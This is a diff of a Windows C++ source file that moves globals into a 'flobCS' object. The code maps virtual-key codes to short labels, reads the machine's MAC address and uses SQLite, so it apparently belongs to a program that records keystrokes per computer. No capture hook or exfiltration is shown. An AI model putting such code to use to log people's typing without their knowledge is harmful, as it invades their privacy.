@@ -6,17 +6,13 @@
 #include <time.h>
 #include <iostream>
 #include <string>
-#include <sstream>
 #include <iomanip>
 #include <windows.h>
 #include <vector>
 #include <iptypes.h>
 #include <iphlpapi.h>
 #include <chrono>
-#include "../sqlite/sqlite3.h"
-
-
-std::wstring_convert<std::codecvt_utf8_utf16<wchar_t > > converter;
+#include "../dependencies/sqlite/sqlite3.h"
 
 void sqlErrCheck(int rc, const std::wstring& additional, sqlite3 *dbcon){
     if(rc == SQLITE_OK || rc == SQLITE_DONE || rc == SQLITE_ROW)
@@ -40,7 +36,7 @@ void execStmt(sqlite3*dbcon, sqlite3_stmt**statement, const std::wstring &stmt){
 }
 
 ComputerHandle getComputerHandle(std::wstring lookupFile){
-    std::string lookupFile_S = converter.to_bytes(lookupFile);
+    std::string lookupFile_S = flobCS.converter.to_bytes(lookupFile);
     std::wfstream lookup;
     lookup.open(lookupFile_S, std::ios::out);
     lookup.close();
@@ -88,7 +84,7 @@ ComputerHandle getComputerHandle(std::wstring lookupFile){
     }
     lookup.close();
 
-    lookup.open(converter.to_bytes(lookupFile), std::ios::out|std::ios::trunc);
+    lookup.open(flobCS.converter.to_bytes(lookupFile), std::ios::out|std::ios::trunc);
     lookup << buffer.str();
     lookup.close();
 
@@ -131,13 +127,13 @@ std::wstring hexStr(u_char *data, size_t len){
         s[2*i]     = hexmap[(data[i]&0xF0)>>4];
         s[2*i+1]   = hexmap[(data[i]&0x0F)];
     }
-    return converter.from_bytes(s);
+    return flobCS.converter.from_bytes(s);
 }
 std::wstring computerHandleStr(){
     static std::wstring handle;
     static wchar_t temp[6] = {0};
     if((int)temp[0] == 0){
-        wsprintfW(temp,L"%05d",globalHandle);
+        wsprintfW(temp,L"%05d",flobCS.globalHandle);
         handle = std::wstring(temp);
     }
     return handle;
@@ -163,117 +159,117 @@ MAC mac(){
     return addresses.front();
 }
 std::wstring map(uint32_t vkc) {
-    if (keys.count(vkc) == 0) {
+    if (flobCS.keys.count(vkc) == 0) {
         wchar_t chr = (wchar_t)MapVirtualKeyW(vkc, MAPVK_VK_TO_CHAR);
         if(chr==0) return L"mist";
         return std::wstring(L"___") + chr;
     }
-    return keys[vkc];
+    return flobCS.keys[vkc];
 }
 void initMap(){
-    keys[VK_TAB]				= L"_TAB";
-    keys[VK_CAPITAL]			= L"CAPS";
-    keys[VK_F1]					= L"__F1";
-    keys[VK_F2]					= L"__F2";
-    keys[VK_F3]					= L"__F3";
-    keys[VK_F4]					= L"__F4";
-    keys[VK_F5]					= L"__F5";
-    keys[VK_F6]					= L"__F6";
-    keys[VK_F7]					= L"__F7";
-    keys[VK_F8]					= L"__F8";
-    keys[VK_F9]					= L"__F9";
-    keys[VK_F10]				= L"_F10";
-    keys[VK_F11]				= L"_F11";
-    keys[VK_F12]				= L"_F12";
-    keys[VK_F13]				= L"_F13";
-    keys[VK_F14]				= L"_F14";
-    keys[VK_F15]				= L"_F15";
-    keys[VK_F16]				= L"_F16";
-    keys[VK_F17]				= L"_F17";
-    keys[VK_F18]				= L"_F18";
-    keys[VK_F19]				= L"_F19";
-    keys[VK_F20]				= L"_F20";
-    keys[VK_F21]				= L"_F21";
-    keys[VK_F22]				= L"_F22";
-    keys[VK_F23]				= L"_F23";
-    keys[VK_F24]				= L"_F24";
-    keys[VK_BACK]				= L"BACK";
-    keys[VK_RETURN]				= L"RETU";
-    keys[VK_ESCAPE]				= L"ESCA";
-    keys[VK_LMENU]				= L"LMEN";
-    keys[VK_RMENU]				= L"RMEN";
-    keys[VK_LCONTROL]			= L"LCTR";
-    keys[VK_RCONTROL]			= L"RCTR";
-    keys[VK_RSHIFT]				= L"RSHI";
-    keys[VK_LSHIFT]				= L"LSHI";
-    keys[VK_LBUTTON]			= L"LMBU";
-    keys[VK_RBUTTON]			= L"RMBU";
-    keys[VK_CANCEL]				= L"CANC";
-    keys[VK_MBUTTON]			= L"MBUT";
-    keys[VK_XBUTTON1]			= L"XBU1";
-    keys[VK_XBUTTON2]			= L"XBU2";
-    keys[VK_CLEAR]				= L"CLEA";
-    keys[VK_PAUSE]				= L"PAUS";
-    keys[VK_FINAL]				= L"FINA";
-    keys[VK_CONVERT]			= L"CONV";
-    keys[VK_NONCONVERT]			= L"NCVT";
-    keys[VK_ACCEPT]				= L"ACCE";
-    keys[VK_MODECHANGE]			= L"MODC";
-    keys[VK_SPACE]				= L"SPAC";
-    keys[VK_PRIOR]				= L"PRIO";
-    keys[VK_NEXT]				= L"NEXT";
-    keys[VK_END]				= L"_END";
-    keys[VK_HOME]				= L"HOME";
-    keys[VK_LEFT]				= L"LEFT";
-    keys[VK_UP]					= L"__UP";
-    keys[VK_RIGHT]				= L"RIGH";
-    keys[VK_DOWN]				= L"DOWN";
-    keys[VK_SELECT]				= L"SELE";
-    keys[VK_PRINT]				= L"PRNT";
-    keys[VK_EXECUTE]			= L"EXEC";
-    keys[VK_SNAPSHOT]			= L"SNAP";
-    keys[VK_INSERT]				= L"INSR";
-    keys[VK_DELETE]				= L"DELE";
-    keys[VK_HELP]				= L"HELP";
-    keys[VK_LWIN]				= L"LWIN";
-    keys[VK_RWIN]				= L"RWIN";
-    keys[VK_APPS]				= L"APPS";
-    keys[VK_SLEEP]				= L"SLEE";
-    keys[VK_NUMPAD0]			= L"NUM0";
-    keys[VK_NUMPAD1]			= L"NUM1";
-    keys[VK_NUMPAD2]			= L"NUM2";
-    keys[VK_NUMPAD3]			= L"NUM3";
-    keys[VK_NUMPAD4]			= L"NUM4";
-    keys[VK_NUMPAD5]			= L"NUM5";
-    keys[VK_NUMPAD6]			= L"NUM6";
-    keys[VK_NUMPAD7]			= L"NUM7";
-    keys[VK_NUMPAD8]			= L"NUM8";
-    keys[VK_NUMPAD9]			= L"NUM9";
-    keys[VK_MULTIPLY]			= L"MULT";
-    keys[VK_ADD]				= L"_ADD";
-    keys[VK_SEPARATOR]			= L"_SEP";
-    keys[VK_SUBTRACT]			= L"_SUB";
-    keys[VK_DECIMAL]			= L"DECI";
-    keys[VK_DIVIDE]				= L"_DIV";
-    keys[VK_NUMLOCK]			= L"NLCK";
-    keys[VK_SCROLL]				= L"SROL";
-    keys[VK_BROWSER_BACK]		= L"BBCK";
-    keys[VK_BROWSER_FORWARD]	= L"BFWD";
-    keys[VK_BROWSER_REFRESH]	= L"BREF";
-    keys[VK_BROWSER_STOP]		= L"BSTP";
-    keys[VK_BROWSER_SEARCH]		= L"BSEA";
-    keys[VK_BROWSER_FAVORITES]	= L"BFAV";
-    keys[VK_BROWSER_HOME]		= L"BHOM";
-    keys[VK_VOLUME_MUTE]		= L"VMUT";
-    keys[VK_VOLUME_DOWN]		= L"VDWN";
-    keys[VK_VOLUME_UP]			= L"_VUP";
-    keys[VK_MEDIA_NEXT_TRACK]	= L"MENX";
-    keys[VK_MEDIA_PREV_TRACK]	= L"MEPR";
-    keys[VK_MEDIA_STOP]			= L"MEST";
-    keys[VK_MEDIA_PLAY_PAUSE]	= L"MEPP";
-    keys[VK_LAUNCH_APP1]		= L"APP1";
-    keys[VK_LAUNCH_APP2]		= L"APP2";
-    keys[VK_LAUNCH_MAIL]		= L"LMAI";
+    flobCS.keys[VK_TAB]				= L"_TAB";
+    flobCS.keys[VK_CAPITAL]			= L"CAPS";
+    flobCS.keys[VK_F1]					= L"__F1";
+    flobCS.keys[VK_F2]					= L"__F2";
+    flobCS.keys[VK_F3]					= L"__F3";
+    flobCS.keys[VK_F4]					= L"__F4";
+    flobCS.keys[VK_F5]					= L"__F5";
+    flobCS.keys[VK_F6]					= L"__F6";
+    flobCS.keys[VK_F7]					= L"__F7";
+    flobCS.keys[VK_F8]					= L"__F8";
+    flobCS.keys[VK_F9]					= L"__F9";
+    flobCS.keys[VK_F10]				= L"_F10";
+    flobCS.keys[VK_F11]				= L"_F11";
+    flobCS.keys[VK_F12]				= L"_F12";
+    flobCS.keys[VK_F13]				= L"_F13";
+    flobCS.keys[VK_F14]				= L"_F14";
+    flobCS.keys[VK_F15]				= L"_F15";
+    flobCS.keys[VK_F16]				= L"_F16";
+    flobCS.keys[VK_F17]				= L"_F17";
+    flobCS.keys[VK_F18]				= L"_F18";
+    flobCS.keys[VK_F19]				= L"_F19";
+    flobCS.keys[VK_F20]				= L"_F20";
+    flobCS.keys[VK_F21]				= L"_F21";
+    flobCS.keys[VK_F22]				= L"_F22";
+    flobCS.keys[VK_F23]				= L"_F23";
+    flobCS.keys[VK_F24]				= L"_F24";
+    flobCS.keys[VK_BACK]				= L"BACK";
+    flobCS.keys[VK_RETURN]				= L"RETU";
+    flobCS.keys[VK_ESCAPE]				= L"ESCA";
+    flobCS.keys[VK_LMENU]				= L"LMEN";
+    flobCS.keys[VK_RMENU]				= L"RMEN";
+    flobCS.keys[VK_LCONTROL]			= L"LCTR";
+    flobCS.keys[VK_RCONTROL]			= L"RCTR";
+    flobCS.keys[VK_RSHIFT]				= L"RSHI";
+    flobCS.keys[VK_LSHIFT]				= L"LSHI";
+    flobCS.keys[VK_LBUTTON]			= L"LMBU";
+    flobCS.keys[VK_RBUTTON]			= L"RMBU";
+    flobCS.keys[VK_CANCEL]				= L"CANC";
+    flobCS.keys[VK_MBUTTON]			= L"MBUT";
+    flobCS.keys[VK_XBUTTON1]			= L"XBU1";
+    flobCS.keys[VK_XBUTTON2]			= L"XBU2";
+    flobCS.keys[VK_CLEAR]				= L"CLEA";
+    flobCS.keys[VK_PAUSE]				= L"PAUS";
+    flobCS.keys[VK_FINAL]				= L"FINA";
+    flobCS.keys[VK_CONVERT]			= L"CONV";
+    flobCS.keys[VK_NONCONVERT]			= L"NCVT";
+    flobCS.keys[VK_ACCEPT]				= L"ACCE";
+    flobCS.keys[VK_MODECHANGE]			= L"MODC";
+    flobCS.keys[VK_SPACE]				= L"SPAC";
+    flobCS.keys[VK_PRIOR]				= L"PRIO";
+    flobCS.keys[VK_NEXT]				= L"NEXT";
+    flobCS.keys[VK_END]				= L"_END";
+    flobCS.keys[VK_HOME]				= L"HOME";
+    flobCS.keys[VK_LEFT]				= L"LEFT";
+    flobCS.keys[VK_UP]					= L"__UP";
+    flobCS.keys[VK_RIGHT]				= L"RIGH";
+    flobCS.keys[VK_DOWN]				= L"DOWN";
+    flobCS.keys[VK_SELECT]				= L"SELE";
+    flobCS.keys[VK_PRINT]				= L"PRNT";
+    flobCS.keys[VK_EXECUTE]			= L"EXEC";
+    flobCS.keys[VK_SNAPSHOT]			= L"SNAP";
+    flobCS.keys[VK_INSERT]				= L"INSR";
+    flobCS.keys[VK_DELETE]				= L"DELE";
+    flobCS.keys[VK_HELP]				= L"HELP";
+    flobCS.keys[VK_LWIN]				= L"LWIN";
+    flobCS.keys[VK_RWIN]				= L"RWIN";
+    flobCS.keys[VK_APPS]				= L"APPS";
+    flobCS.keys[VK_SLEEP]				= L"SLEE";
+    flobCS.keys[VK_NUMPAD0]			= L"NUM0";
+    flobCS.keys[VK_NUMPAD1]			= L"NUM1";
+    flobCS.keys[VK_NUMPAD2]			= L"NUM2";
+    flobCS.keys[VK_NUMPAD3]			= L"NUM3";
+    flobCS.keys[VK_NUMPAD4]			= L"NUM4";
+    flobCS.keys[VK_NUMPAD5]			= L"NUM5";
+    flobCS.keys[VK_NUMPAD6]			= L"NUM6";
+    flobCS.keys[VK_NUMPAD7]			= L"NUM7";
+    flobCS.keys[VK_NUMPAD8]			= L"NUM8";
+    flobCS.keys[VK_NUMPAD9]			= L"NUM9";
+    flobCS.keys[VK_MULTIPLY]			= L"MULT";
+    flobCS.keys[VK_ADD]				= L"_ADD";
+    flobCS.keys[VK_SEPARATOR]			= L"_SEP";
+    flobCS.keys[VK_SUBTRACT]			= L"_SUB";
+    flobCS.keys[VK_DECIMAL]			= L"DECI";
+    flobCS.keys[VK_DIVIDE]				= L"_DIV";
+    flobCS.keys[VK_NUMLOCK]			= L"NLCK";
+    flobCS.keys[VK_SCROLL]				= L"SROL";
+    flobCS.keys[VK_BROWSER_BACK]		= L"BBCK";
+    flobCS.keys[VK_BROWSER_FORWARD]	= L"BFWD";
+    flobCS.keys[VK_BROWSER_REFRESH]	= L"BREF";
+    flobCS.keys[VK_BROWSER_STOP]		= L"BSTP";
+    flobCS.keys[VK_BROWSER_SEARCH]		= L"BSEA";
+    flobCS.keys[VK_BROWSER_FAVORITES]	= L"BFAV";
+    flobCS.keys[VK_BROWSER_HOME]		= L"BHOM";
+    flobCS.keys[VK_VOLUME_MUTE]		= L"VMUT";
+    flobCS.keys[VK_VOLUME_DOWN]		= L"VDWN";
+    flobCS.keys[VK_VOLUME_UP]			= L"_VUP";
+    flobCS.keys[VK_MEDIA_NEXT_TRACK]	= L"MENX";
+    flobCS.keys[VK_MEDIA_PREV_TRACK]	= L"MEPR";
+    flobCS.keys[VK_MEDIA_STOP]			= L"MEST";
+    flobCS.keys[VK_MEDIA_PLAY_PAUSE]	= L"MEPP";
+    flobCS.keys[VK_LAUNCH_APP1]		= L"APP1";
+    flobCS.keys[VK_LAUNCH_APP2]		= L"APP2";
+    flobCS.keys[VK_LAUNCH_MAIL]		= L"LMAI";
     /*
 #define VK_OEM_1 0xBA
 #define VK_OEM_PLUS 0xBB
